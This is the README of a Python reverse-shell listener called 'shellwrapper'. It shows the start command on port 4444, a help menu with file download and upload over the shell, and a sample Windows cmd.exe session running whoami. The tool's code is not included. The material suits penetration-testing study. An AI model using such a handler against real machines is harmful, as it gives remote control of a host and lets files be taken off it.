# shellwrapper
A generic reverse shell listening server that allows uploading and downloading of files over the shell connection.

# Usage
Start the wrapper on a port using
```
> python3 wrapper.py 4444
Listening on port 4444
```
Run the cmd.exe reverse shell on the target.
```
Connection received from ('127.0.0.1', 65146)
dodowrapper$ help
shell     interact with the shell
download  download a file from the target
upload    upload a file to the target
exit      quit
dodowrapper$
```
Download a file
```
dodowrapper$ download test.txt
dodowrapper$
```
Upload a file
```
dodowrapper$ upload test.txt
upload successful
```
Interact with shell
```
dodowrapper$ shell
Microsoft Windows [Version 10.0.19044.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dodo\Desktop\Code>whoami
whoami
computer\dodo

C:\Users\dodo\Desktop\Code>
```
